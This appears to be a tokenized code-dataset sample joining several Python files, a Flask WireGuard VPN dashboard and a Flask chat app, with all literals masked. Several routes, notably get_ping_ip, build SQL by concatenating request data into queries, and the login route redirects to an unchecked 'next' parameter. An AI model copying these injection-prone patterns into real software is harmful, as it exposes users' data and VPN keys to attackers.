g . cur . execute ( sql , ( name , private_key , dns_addresses , endpoint_allowed_ip , data [ "<STR_LIT>" ] , <EOL> data [ "<STR_LIT>" ] , preshared_key , id ) ) <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> except subprocess . CalledProcessError as exc : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : str ( exc . output . decode ( "<STR_LIT>" ) . strip ( ) ) } ) <EOL> else : <EOL> return jsonify ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def get_peer_name ( config_name ) : <EOL> data = request . get_json ( ) <EOL> peer_id = data [ '<STR_LIT>' ] <EOL> result = g . cur . execute ( <EOL> "<STR_LIT>" <EOL> + config_name + "<STR_LIT>" , ( peer_id , ) ) . fetchall ( ) <EOL> data = { "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] , "<STR_LIT>" : result [ <NUM_LIT> ] [ <NUM_LIT> ] } <EOL> return jsonify ( data ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def available_ips ( config_name ) : <EOL> result = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : f_available_ips ( config_name ) } <EOL> if len ( result [ "<STR_LIT>" ] ) == <NUM_LIT> : <EOL> result [ '<STR_LIT>' ] = False <EOL> result [ '<STR_LIT>' ] = f"<STR_LIT>" <EOL> return jsonify ( result ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def check_key_match ( config_name ) : <EOL> data = request . get_json ( ) <EOL> private_key = data [ '<STR_LIT>' ] <EOL> public_key = data [ '<STR_LIT>' ] <EOL> return jsonify ( f_check_key_match ( private_key , public_key , config_name ) ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def generate_qrcode ( config_name ) : <EOL> peer_id = request . args . get ( '<STR_LIT>' ) <EOL> get_peer = g . cur . execute ( <EOL> "<STR_LIT>" <EOL> + config_name + "<STR_LIT>" , ( peer_id , ) ) . fetchall ( ) <EOL> config = get_dashboard_conf ( ) <EOL> if len ( get_peer ) == <NUM_LIT> : <EOL> peer = get_peer [ <NUM_LIT> ] <EOL> if peer [ <NUM_LIT> ] != "<STR_LIT>" : <EOL> public_key = get_conf_pub_key ( config_name ) <EOL> listen_port = get_conf_listen_port ( config_name ) <EOL> endpoint = config . get ( "<STR_LIT>" , "<STR_LIT>" ) + "<STR_LIT>" + listen_port <EOL> private_key = peer [ <NUM_LIT> ] <EOL> allowed_ip = peer [ <NUM_LIT> ] <EOL> dns_addresses = peer [ <NUM_LIT> ] <EOL> mtu_value = peer [ <NUM_LIT> ] <EOL> endpoint_allowed_ip = peer [ <NUM_LIT> ] <EOL> keepalive = peer [ <NUM_LIT> ] <EOL> preshared_key = peer [ <NUM_LIT> ] <EOL> result = "<STR_LIT>" + private_key + "<STR_LIT>" + allowed_ip + "<STR_LIT>" + str ( mtu_value ) + "<STR_LIT>" + dns_addresses + "<STR_LIT>" + public_key + "<STR_LIT>" + endpoint_allowed_ip + "<STR_LIT>" + str ( keepalive ) + "<STR_LIT>" + endpoint <EOL> if preshared_key != "<STR_LIT>" : <EOL> result += "<STR_LIT>" + preshared_key <EOL> return render_template ( "<STR_LIT>" , i = result ) <EOL> else : <EOL> return redirect ( "<STR_LIT>" + config_name ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def download_all ( config_name ) : <EOL> get_peer = g . cur . execute ( <EOL> "<STR_LIT>" <EOL> + config_name + "<STR_LIT>" ) . fetchall ( ) <EOL> config = get_dashboard_conf ( ) <EOL> data = [ ] <EOL> public_key = get_conf_pub_key ( config_name ) <EOL> listen_port = get_conf_listen_port ( config_name ) <EOL> endpoint = config . get ( "<STR_LIT>" , "<STR_LIT>" ) + "<STR_LIT>" + listen_port <EOL> for peer in get_peer : <EOL> private_key = peer [ <NUM_LIT> ] <EOL> allowed_ip = peer [ <NUM_LIT> ] <EOL> dns_addresses = peer [ <NUM_LIT> ] <EOL> mtu_value = peer [ <NUM_LIT> ] <EOL> endpoint_allowed_ip = peer [ <NUM_LIT> ] <EOL> keepalive = peer [ <NUM_LIT> ] <EOL> preshared_key = peer [ <NUM_LIT> ] <EOL> filename = peer [ <NUM_LIT> ] <EOL> if len ( filename ) == <NUM_LIT> : <EOL> filename = "<STR_LIT>" <EOL> else : <EOL> filename = peer [ <NUM_LIT> ] <EOL> illegal_filename = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , '<STR_LIT>' '<STR_LIT>' , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> for i in illegal_filename : <EOL> filename = filename . replace ( i , "<STR_LIT>" ) <EOL> if len ( filename ) == <NUM_LIT> : <EOL> filename = "<STR_LIT>" <EOL> filename = "<STR_LIT>" . join ( filename . split ( '<STR_LIT>' ) ) <EOL> filename = filename + "<STR_LIT>" + config_name <EOL> psk = "<STR_LIT>" <EOL> if preshared_key != "<STR_LIT>" : <EOL> psk = "<STR_LIT>" + preshared_key <EOL> return_data = "<STR_LIT>" + private_key + "<STR_LIT>" + allowed_ip + "<STR_LIT>" + dns_addresses + "<STR_LIT>" + str ( mtu_value ) + "<STR_LIT>" + public_key + "<STR_LIT>" + endpoint_allowed_ip + "<STR_LIT>" + endpoint + "<STR_LIT>" + str ( keepalive ) + psk <EOL> data . append ( { "<STR_LIT>" : f"<STR_LIT>" , "<STR_LIT>" : return_data } ) <EOL> return jsonify ( { "<STR_LIT>" : True , "<STR_LIT>" : data , "<STR_LIT>" : f"<STR_LIT>" } ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def download ( config_name ) : <EOL> peer_id = request . args . get ( '<STR_LIT>' ) <EOL> get_peer = g . cur . execute ( <EOL> "<STR_LIT>" <EOL> + config_name + "<STR_LIT>" , ( peer_id , ) ) . fetchall ( ) <EOL> config = get_dashboard_conf ( ) <EOL> if len ( get_peer ) == <NUM_LIT> : <EOL> peer = get_peer [ <NUM_LIT> ] <EOL> if peer [ <NUM_LIT> ] != "<STR_LIT>" : <EOL> public_key = get_conf_pub_key ( config_name ) <EOL> listen_port = get_conf_listen_port ( config_name ) <EOL> endpoint = config . get ( "<STR_LIT>" , "<STR_LIT>" ) + "<STR_LIT>" + listen_port <EOL> private_key = peer [ <NUM_LIT> ] <EOL> allowed_ip = peer [ <NUM_LIT> ] <EOL> dns_addresses = peer [ <NUM_LIT> ] <EOL> mtu_value = peer [ <NUM_LIT> ] <EOL> endpoint_allowed_ip = peer [ <NUM_LIT> ] <EOL> keepalive = peer [ <NUM_LIT> ] <EOL> preshared_key = peer [ <NUM_LIT> ] <EOL> filename = peer [ <NUM_LIT> ] <EOL> if len ( filename ) == <NUM_LIT> : <EOL> filename = "<STR_LIT>" <EOL> else : <EOL> filename = peer [ <NUM_LIT> ] <EOL> illegal_filename = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , '<STR_LIT>' '<STR_LIT>' , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , <EOL> "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> for i in illegal_filename : <EOL> filename = filename . replace ( i , "<STR_LIT>" ) <EOL> if len ( filename ) == <NUM_LIT> : <EOL> filename = "<STR_LIT>" <EOL> filename = "<STR_LIT>" . join ( filename . split ( '<STR_LIT>' ) ) <EOL> filename = filename + "<STR_LIT>" + config_name <EOL> psk = "<STR_LIT>" <EOL> if preshared_key != "<STR_LIT>" : <EOL> psk = "<STR_LIT>" + preshared_key <EOL> return_data = "<STR_LIT>" + private_key + "<STR_LIT>" + allowed_ip + "<STR_LIT>" + dns_addresses + "<STR_LIT>" + str ( mtu_value ) + "<STR_LIT>" + public_key + "<STR_LIT>" + endpoint_allowed_ip + "<STR_LIT>" + endpoint + "<STR_LIT>" + str ( keepalive ) + psk <EOL> return jsonify ( { "<STR_LIT>" : True , "<STR_LIT>" : f"<STR_LIT>" , "<STR_LIT>" : return_data } ) <EOL> return jsonify ( { "<STR_LIT>" : False , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def switch_display_mode ( mode ) : <EOL> if mode in [ '<STR_LIT>' , '<STR_LIT>' ] : <EOL> config = get_dashboard_conf ( ) <EOL> config . set ( "<STR_LIT>" , "<STR_LIT>" , mode ) <EOL> set_dashboard_conf ( config ) <EOL> config . clear ( ) <EOL> return "<STR_LIT>" <EOL> return "<STR_LIT>" <EOL> import api <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def togglePeerAccess ( ) : <EOL> data = request . get_json ( ) <EOL> returnData = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> required = [ '<STR_LIT>' , '<STR_LIT>' ] <EOL> if checkJSONAllParameter ( required , data ) : <EOL> returnData = api . togglePeerAccess ( data , g ) <EOL> else : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> return jsonify ( returnData ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def addConfigurationAddressCheck ( ) : <EOL> data = request . get_json ( ) <EOL> returnData = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> required = [ '<STR_LIT>' ] <EOL> if checkJSONAllParameter ( required , data ) : <EOL> returnData = api . addConfiguration . AddressCheck ( api . addConfiguration , data ) <EOL> else : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> return jsonify ( returnData ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def addConfigurationPortCheck ( ) : <EOL> data = request . get_json ( ) <EOL> returnData = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> required = [ '<STR_LIT>' ] <EOL> if checkJSONAllParameter ( required , data ) : <EOL> returnData = api . addConfiguration . PortCheck ( api . addConfiguration , data , get_conf_list ( ) ) <EOL> else : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> return jsonify ( returnData ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def addConfigurationNameCheck ( ) : <EOL> data = request . get_json ( ) <EOL> returnData = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> required = [ '<STR_LIT>' ] <EOL> if checkJSONAllParameter ( required , data ) : <EOL> returnData = api . addConfiguration . NameCheck ( api . addConfiguration , data , get_conf_list ( ) ) <EOL> else : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> return jsonify ( returnData ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ "<STR_LIT>" ] ) <EOL> def addConfiguration ( ) : <EOL> data = request . get_json ( ) <EOL> returnData = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" } <EOL> required = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' ] <EOL> needFilled = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' ] <EOL> if not checkJSONAllParameter ( needFilled , data ) : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> for i in required : <EOL> if i not in data . keys ( ) : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> config = get_conf_list ( ) <EOL> nameCheck = api . addConfiguration . NameCheck ( api . addConfiguration , { "<STR_LIT>" : data [ '<STR_LIT>' ] } , config ) <EOL> if not nameCheck [ '<STR_LIT>' ] : <EOL> return nameCheck <EOL> portCheck = api . addConfiguration . PortCheck ( api . addConfiguration , { "<STR_LIT>" : data [ '<STR_LIT>' ] } , config ) <EOL> if not portCheck [ '<STR_LIT>' ] : <EOL> return portCheck <EOL> addressCheck = api . addConfiguration . AddressCheck ( api . addConfiguration , { "<STR_LIT>" : data [ '<STR_LIT>' ] } ) <EOL> if not addressCheck [ '<STR_LIT>' ] : <EOL> return addressCheck <EOL> returnData = api . addConfiguration . addConfiguration ( api . addConfiguration , data , config , WG_CONF_PATH ) <EOL> return jsonify ( returnData ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def deleteConfiguration ( ) : <EOL> data = request . get_json ( ) <EOL> returnData = { "<STR_LIT>" : True , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } <EOL> required = [ '<STR_LIT>' ] <EOL> if not checkJSONAllParameter ( required , data ) : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> returnData = api . addConfiguration . deleteConfiguration ( api . addConfiguration , data , get_conf_list ( ) , g , WG_CONF_PATH ) <EOL> return returnData <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def setTheme ( ) : <EOL> data = request . get_json ( ) <EOL> required = [ '<STR_LIT>' ] <EOL> if not checkJSONAllParameter ( required , data ) : <EOL> return jsonify ( api . notEnoughParameter ) <EOL> else : <EOL> return api . settings . setTheme ( api . settings , data [ '<STR_LIT>' ] , get_dashboard_conf ( ) , set_dashboard_conf ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def get_ping_ip ( ) : <EOL> config = request . form [ '<STR_LIT>' ] <EOL> peers = g . cur . execute ( "<STR_LIT>" + config ) . fetchall ( ) <EOL> html = "<STR_LIT>" <EOL> for i in peers : <EOL> html += '<STR_LIT>' + i [ <NUM_LIT> ] + '<STR_LIT>' + i [ <NUM_LIT> ] + '<STR_LIT>' <EOL> allowed_ip = str ( i [ <NUM_LIT> ] ) . split ( "<STR_LIT>" ) <EOL> for k in allowed_ip : <EOL> k = k . split ( "<STR_LIT>" ) <EOL> if len ( k ) == <NUM_LIT> : <EOL> html += "<STR_LIT>" + k [ <NUM_LIT> ] + "<STR_LIT>" + k [ <NUM_LIT> ] + "<STR_LIT>" <EOL> endpoint = str ( i [ <NUM_LIT> ] ) . split ( "<STR_LIT>" ) <EOL> if len ( endpoint ) == <NUM_LIT> : <EOL> html += "<STR_LIT>" + endpoint [ <NUM_LIT> ] + "<STR_LIT>" + endpoint [ <NUM_LIT> ] + "<STR_LIT>" <EOL> html += "<STR_LIT>" <EOL> return html <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def ping_ip ( ) : <EOL> try : <EOL> result = ping ( '<STR_LIT>' + request . form [ '<STR_LIT>' ] + '<STR_LIT>' , count = int ( request . form [ '<STR_LIT>' ] ) , privileged = True , source = None ) <EOL> returnjson = { <EOL> "<STR_LIT>" : result . address , <EOL> "<STR_LIT>" : result . is_alive , <EOL> "<STR_LIT>" : result . min_rtt , <EOL> "<STR_LIT>" : result . avg_rtt , <EOL> "<STR_LIT>" : result . max_rtt , <EOL> "<STR_LIT>" : result . packets_sent , <EOL> "<STR_LIT>" : result . packets_received , <EOL> "<STR_LIT>" : result . packet_loss <EOL> } <EOL> if returnjson [ '<STR_LIT>' ] == <NUM_LIT> : <EOL> returnjson [ '<STR_LIT>' ] = returnjson [ '<STR_LIT>' ] <EOL> return jsonify ( returnjson ) <EOL> except Exception : <EOL> return "<STR_LIT>" <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def traceroute_ip ( ) : <EOL> try : <EOL> result = traceroute ( '<STR_LIT>' + request . form [ '<STR_LIT>' ] + '<STR_LIT>' , first_hop = <NUM_LIT> , max_hops = <NUM_LIT> , count = <NUM_LIT> , fast = True ) <EOL> returnjson = [ ] <EOL> last_distance = <NUM_LIT> <EOL> for hop in result : <EOL> if last_distance + <NUM_LIT> != hop . distance : <EOL> returnjson . append ( { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } ) <EOL> returnjson . append ( { "<STR_LIT>" : hop . distance , "<STR_LIT>" : hop . address , "<STR_LIT>" : hop . avg_rtt , "<STR_LIT>" : hop . min_rtt , <EOL> "<STR_LIT>" : hop . max_rtt } ) <EOL> last_distance = hop . distance <EOL> return jsonify ( returnjson ) <EOL> except Exception : <EOL> return "<STR_LIT>" <EOL> def get_host_bind ( ) : <EOL> init_dashboard ( ) <EOL> run_dashboard ( ) <EOL> config = configparser . ConfigParser ( strict = False ) <EOL> config . read ( '<STR_LIT>' ) <EOL> app_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> app_port = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> return app_ip , app_port <EOL> if __name__ == "<STR_LIT>" : <EOL> init_dashboard ( ) <EOL> config = configparser . ConfigParser ( strict = False ) <EOL> config . read ( '<STR_LIT>' ) <EOL> app_ip = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> app_port = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> WG_CONF_PATH = config . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> config . clear ( ) <EOL> app . run ( host = app_ip , debug = True , port = app_port ) <EOL> </s>
<s> from datetime import datetime <EOL> from flask import url_for <EOL> from flask_socketio import emit <EOL> from flask_login import current_user <EOL> from app . main . utils import convert_time_to_string <EOL> from app . models import db , Channel , Message <EOL> def add_message ( data : dict ) -> None : <EOL> channel = data [ '<STR_LIT>' ] <EOL> message_content = data [ '<STR_LIT>' ] <EOL> username = current_user . username <EOL> user_id = current_user . id <EOL> user_picture = f"<STR_LIT>" <EOL> full_time = datetime . utcnow ( ) <EOL> channel_id = Channel . query . filter_by ( name = channel ) . first ( ) . id <EOL> db . session . add ( Message ( <EOL> content = message_content , author_id = user_id , time = full_time , target_channel = channel_id <EOL> ) ) <EOL> db . session . commit ( ) <EOL> return announce_message ( username , user_picture , convert_time_to_string ( full_time ) , channel , message_content ) <EOL> def announce_message ( user_name : str , user_picture : str , time : str , channel : str , message_content : str ) -> None : <EOL> response = { <EOL> '<STR_LIT>' : user_name , <EOL> '<STR_LIT>' : user_picture , <EOL> '<STR_LIT>' : time , <EOL> '<STR_LIT>' : channel , <EOL> '<STR_LIT>' : message_content <EOL> } <EOL> emit ( '<STR_LIT>' , response , room = channel ) <EOL> </s>
<s> from . base import ma <EOL> from app . models import User <EOL> class UserSchema ( ma . SQLAlchemySchema ) : <EOL> class Meta : <EOL> model = User <EOL> username = ma . auto_field ( ) <EOL> </s>
<s> from enum import Enum <EOL> from . base import db <EOL> class UserRole ( Enum ) : <EOL> NORMAL_USER = <NUM_LIT> <EOL> ADMIN = <NUM_LIT> <EOL> class ChannelAllowList ( db . Model ) : <EOL> __tablename__ = '<STR_LIT>' <EOL> id = db . Column ( db . Integer , primary_key = True ) <EOL> user_role = db . Column ( db . Integer , db . Enum ( UserRole ) , nullable = False , default = UserRole . NORMAL_USER . value ) <EOL> channel_id = db . Column ( db . Integer , db . ForeignKey ( '<STR_LIT>' ) , nullable = False ) <EOL> user_id = db . Column ( db . Integer , db . ForeignKey ( '<STR_LIT>' ) , nullable = False ) <EOL> member = db . relationship ( '<STR_LIT>' , lazy = True ) <EOL> def __repr__ ( self ) -> str : <EOL> return ( "<STR_LIT>" + <EOL> f"<STR_LIT>" + <EOL> "<STR_LIT>" ) <EOL> </s>
<s> from . routes import main <EOL> from flask import Flask <EOL> def init_app ( app : Flask ) -> None : <EOL> app . register_blueprint ( main ) <EOL> </s>
<s> import re <EOL> from flask_login import current_user <EOL> from flask_wtf import FlaskForm <EOL> from wtforms import StringField , SubmitField , PasswordField <EOL> from wtforms . validators import DataRequired , ValidationError , Length , EqualTo <EOL> from app . models import Channel , ChannelAllowList <EOL> class ChannelForm ( FlaskForm ) : <EOL> @ staticmethod <EOL> def _channel_has_invalid_name ( name : str ) -> bool : <EOL> valid_pattern = re . compile ( r'<STR_LIT>' ) <EOL> if not name : <EOL> return True <EOL> else : <EOL> return not ( bool ( re . fullmatch ( valid_pattern , name ) ) ) or name . startswith ( '<STR_LIT>' ) or name . endswith ( '<STR_LIT>' ) <EOL> @ staticmethod <EOL> def _channel_already_exists ( name : str ) -> bool : <EOL> channel = Channel . query . filter_by ( name = name ) . first ( ) <EOL> return bool ( channel ) <EOL> class AddChannelForm ( ChannelForm ) : <EOL> name = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) , Length ( min = <NUM_LIT> , max = <NUM_LIT> ) ] ) <EOL> password = PasswordField ( '<STR_LIT>' , validators = [ DataRequired ( ) ] ) <EOL> confirm_password = PasswordField ( '<STR_LIT>' , validators = [ <EOL> DataRequired ( ) , EqualTo ( '<STR_LIT>' , message = '<STR_LIT>' ) <EOL> ] ) <EOL> submit_add = SubmitField ( '<STR_LIT>' ) <EOL> def validate_name ( self , name : StringField ) -> None : <EOL> if self . _channel_already_exists ( name . data ) : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> elif self . _channel_has_invalid_name ( name . data ) : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> class JoinChannelForm ( ChannelForm ) : <EOL> name = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) ] ) <EOL> password = PasswordField ( '<STR_LIT>' , validators = [ DataRequired ( ) ] ) <EOL> submit_join = SubmitField ( '<STR_LIT>' ) <EOL> def validate_name ( self , name : StringField ) -> None : <EOL> if channel := Channel . query . filter_by ( name = name . data ) . first ( ) : <EOL> if ChannelAllowList . query . filter_by ( user_id = current_user . id ) . filter_by ( channel_id = channel . id ) . first ( ) : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> class UpdateChannelForm ( ChannelForm ) : <EOL> name = StringField ( '<STR_LIT>' , validators = [ DataRequired ( ) ] ) <EOL> submit_update = SubmitField ( '<STR_LIT>' ) <EOL> def validate_name ( self , name : StringField ) -> None : <EOL> if self . _channel_already_exists ( name . data ) : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> elif self . _channel_has_invalid_name ( name . data ) : <EOL> raise ValidationError ( '<STR_LIT>' ) <EOL> </s>
<s> from . base import ma <EOL> from app . models import ChannelAllowList <EOL> from . user import UserSchema <EOL> class ChannelAllowListSchema ( ma . SQLAlchemySchema ) : <EOL> class Meta : <EOL> model = ChannelAllowList <EOL> user_role = ma . auto_field ( ) <EOL> member = ma . Nested ( UserSchema ) <EOL> </s>
<s> from secrets import token_hex <EOL> from os import path , remove <EOL> from PIL import Image <EOL> from flask_login import current_user <EOL> from typing import Optional , Final <EOL> from werkzeug . datastructures import FileStorage <EOL> from app . path import APP_PATH <EOL> from app . bcrypt . utils import hash_password , check_hashed_password <EOL> from app . forms . registration import RegistrationForm <EOL> from app . forms . login import LoginForm <EOL> from app . models import db , ChannelAllowList , Message <EOL> from app . models . user import User , DEFAULT_PROFILE_PICTURE <EOL> IMAGE_SIDE_SIZE : Final = <NUM_LIT> <EOL> def add_user ( form : RegistrationForm ) -> None : <EOL> hashed_password = hash_password ( form . password . data ) <EOL> db . session . add ( User ( <EOL> username = form . username . data , email = form . email . data , password = hashed_password <EOL> ) ) <EOL> db . session . commit ( ) <EOL> def is_valid_user ( user : Optional [ User ] , form : LoginForm ) -> bool : <EOL> if isinstance ( user , User ) : <EOL> return check_hashed_password ( user . password , form . password . data ) <EOL> else : <EOL> return False <EOL> def get_number_of_all_messages ( ) -> int : <EOL> number_of_all_messages : int = Message . query . filter_by ( author_id = current_user . id ) . count ( ) <EOL> return number_of_all_messages <EOL> def get_number_of_all_channels ( ) -> int : <EOL> number_of_all_channels : int = ChannelAllowList . query . filter_by ( user_id = current_user . id ) . count ( ) <EOL> return number_of_all_channels <EOL> def update_user ( username : str , email : str ) -> None : <EOL> current_user . username = username <EOL> current_user . email = email <EOL> db . session . commit ( ) <EOL> def get_profile_picture_full_path ( profile_picture_filename : str ) -> str : <EOL> return path . join ( APP_PATH , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , profile_picture_filename ) <EOL> def remove_old_profile_picture ( ) -> None : <EOL> if current_user . profile_picture != DEFAULT_PROFILE_PICTURE : <EOL> old_profile_picture_path = get_profile_picture_full_path ( current_user . profile_picture ) <EOL> remove ( old_profile_picture_path ) <EOL> def make_square ( image : Image ) -> Image : <EOL> x , y = image . size <EOL> fill_color = ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> new_image = Image . new ( '<STR_LIT>' , ( IMAGE_SIDE_SIZE , IMAGE_SIDE_SIZE ) , fill_color ) <EOL> new_image . paste ( image , ( int ( ( IMAGE_SIDE_SIZE - x ) / <NUM_LIT> ) , int ( ( IMAGE_SIDE_SIZE - y ) / <NUM_LIT> ) ) ) <EOL> return new_image <EOL> def save_profile_picture ( picture : FileStorage ) -> str : <EOL> random_hex = token_hex ( <NUM_LIT> ) <EOL> _ , file_extension = path . splitext ( picture . filename ) <EOL> assert isinstance ( file_extension , str ) <EOL> picture_filename = random_hex + file_extension <EOL> picture_path = get_profile_picture_full_path ( picture_filename ) <EOL> output_size = ( IMAGE_SIDE_SIZE , IMAGE_SIDE_SIZE ) <EOL> image = Image . open ( picture ) <EOL> image . thumbnail ( output_size ) <EOL> square_image = make_square ( image ) <EOL> square_image . save ( picture_path ) <EOL> return picture_filename <EOL> </s>
<s> from flask import Blueprint <EOL> api = Blueprint ( '<STR_LIT>' , __name__ ) <EOL> </s>
<s> from . routes import login <EOL> from flask import Flask <EOL> def init_app ( app : Flask ) -> None : <EOL> app . register_blueprint ( login ) <EOL> </s>
<s> from flask import Blueprint <EOL> cli_bp = Blueprint ( '<STR_LIT>' , __name__ , cli_group = None ) <EOL> </s>
<s> from flask import render_template , flash , url_for , redirect , request <EOL> from flask_login import login_user , current_user , logout_user , login_required <EOL> from typing import Union <EOL> from werkzeug . wrappers import Response <EOL> from . base import login <EOL> from . utils import add_user , is_valid_user , get_number_of_all_messages , get_number_of_all_channels , update_user , save_profile_picture , remove_old_profile_picture <EOL> from app . forms . registration import RegistrationForm <EOL> from app . forms . login import LoginForm <EOL> from app . forms . update_profile import UpdateProfileForm <EOL> from app . models . user import User <EOL> @ login . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def index ( ) -> Union [ Response , str ] : <EOL> if current_user . is_authenticated : <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> form = LoginForm ( ) <EOL> if form . validate_on_submit ( ) : <EOL> user = User . query . filter_by ( email = form . email . data ) . first ( ) <EOL> if is_valid_user ( user , form ) : <EOL> login_user ( user = user , remember = form . remember ) <EOL> next_page = request . args . get ( '<STR_LIT>' ) <EOL> return redirect ( next_page ) if next_page else redirect ( url_for ( '<STR_LIT>' ) ) <EOL> else : <EOL> flash ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> return render_template ( '<STR_LIT>' , form = form ) <EOL> @ login . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def register ( ) -> Union [ Response , str ] : <EOL> form = RegistrationForm ( ) <EOL> if form . validate_on_submit ( ) : <EOL> add_user ( form ) <EOL> flash ( f'<STR_LIT>' , '<STR_LIT>' ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> else : <EOL> return render_template ( '<STR_LIT>' , form = form ) <EOL> @ login . route ( '<STR_LIT>' ) <EOL> @ login_required <EOL> def log_out ( ) -> Response : <EOL> logout_user ( ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> @ login . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> @ login_required <EOL> def settings ( ) -> Union [ str , Response ] : <EOL> all_messages = get_number_of_all_messages ( ) <EOL> all_channels = get_number_of_all_channels ( ) <EOL> form = UpdateProfileForm ( ) <EOL> if form . validate_on_submit ( ) : <EOL> if form . profile_picture . data 